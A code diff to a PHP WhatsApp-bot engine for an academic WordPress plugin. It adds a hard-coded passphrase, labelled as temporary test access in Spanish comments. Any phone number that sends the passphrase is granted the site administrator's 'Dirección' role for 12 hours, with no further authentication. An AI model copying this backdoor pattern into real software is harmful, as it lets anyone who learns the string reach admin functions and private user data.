@@ -9,6 +9,14 @@ if ( ! defined( 'ABSPATH' ) ) { exit; }
 
 class Cead_Acad_WA_Engine {
 
+	/**
+	 * ⚠️ TEMPORAL — ACCESO DE PRUEBA. BORRAR ANTES DE PRODUCCIÓN.
+	 * Si un número escribe exactamente esta frase, el bot lo trata como Dirección
+	 * (usando el admin de WordPress) durante 12 h, sin modificar metadatos de
+	 * usuarios. Para desactivarlo: poné '' o eliminá los bloques marcados «TEMP».
+	 */
+	const TEMP_ADMIN_PHRASE = '@Cead_2026@_';
+
 	private $store;
 	private $bridge;
 	private $broadcaster;
@@ -34,7 +42,7 @@ class Cead_Acad_WA_Engine {
 			return;
 		}
 
-		$identity = Cead_Acad_WA_Identity::resolve( $phone );
+		$identity = $this->resolve_identity( $phone );
 
 		$existing = $this->store->get_number( $phone );
 		if ( ! $existing ) {
@@ -60,6 +68,15 @@ class Cead_Acad_WA_Engine {
 			$this->store->set_opt_out( $phone, true );
 			$this->store->reset_state( $phone );
 			$this->send( $phone, $this->m( 'opt_out_confirmed' ), 'opt_out' );
+			return;
+		}
+
+		// ⚠️ TEMP — acceso de prueba: la frase clave eleva el número a Dirección.
+		if ( self::TEMP_ADMIN_PHRASE !== '' && trim( $body ) === self::TEMP_ADMIN_PHRASE ) {
+			$this->enable_temp_admin( $phone );
+			$this->store->reset_state( $phone );
+			$this->send( $phone, '✅ Acceso de prueba activado. Entrás como *Dirección* por 12 h.' );
+			$this->idle( $phone, $name, $this->resolve_identity( $phone ) );
 			return;
 		}
 
@@ -991,7 +1008,7 @@ class Cead_Acad_WA_Engine {
 
 	private function reenter_staff( $phone ) {
 		// Vuelve al menú del rol; si el usuario tiene varios, al selector.
-		$identity = Cead_Acad_WA_Identity::resolve( $phone );
+		$identity = $this->resolve_identity( $phone );
 		$menus    = $this->available_role_menus( $identity );
 		if ( count( $menus ) === 1 ) {
 			$this->enter_role_menu( $phone, array_key_first( $menus ), $identity );
@@ -1123,6 +1140,35 @@ class Cead_Acad_WA_Engine {
 
 	private function invalid( $phone ) {
 		$this->send( $phone, $this->m( 'invalid_option' ) );
+	}
+
+	/**
+	 * Resuelve la identidad del número. Aplica el override TEMPORAL de prueba:
+	 * si el número activó la frase clave y no tiene un usuario real asociado, se
+	 * lo trata como el admin de WordPress (Dirección). Quitar junto al bloque TEMP.
+	 */
+	private function resolve_identity( $phone ) {
+		$identity = Cead_Acad_WA_Identity::resolve( $phone );
+		// ⚠️ TEMP — override de admin de prueba.
+		if ( ! $identity['user_id'] && self::TEMP_ADMIN_PHRASE !== '' && $this->has_temp_admin( $phone ) ) {
+			$aid = $this->first_admin_id();
+			if ( $aid ) {
+				$identity = [ 'user_id' => $aid, 'is_student' => false, 'is_staff' => true ];
+			}
+		}
+		return $identity;
+	}
+
+	// ⚠️ TEMP — helpers del acceso de prueba. Borrar junto a TEMP_ADMIN_PHRASE.
+	private function enable_temp_admin( $phone ) {
+		set_transient( 'cead_acad_wa_tempadmin_' . md5( $phone ), 1, 12 * HOUR_IN_SECONDS );
+	}
+	private function has_temp_admin( $phone ) {
+		return (bool) get_transient( 'cead_acad_wa_tempadmin_' . md5( $phone ) );
+	}
+	private function first_admin_id() {
+		$ids = get_users( [ 'role' => 'administrator', 'number' => 1, 'fields' => 'ID', 'orderby' => 'ID', 'order' => 'ASC' ] );
+		return $ids ? (int) $ids[0] : 0;
 	}
 
 	private function send( $phone, $message, $action = '' ) {
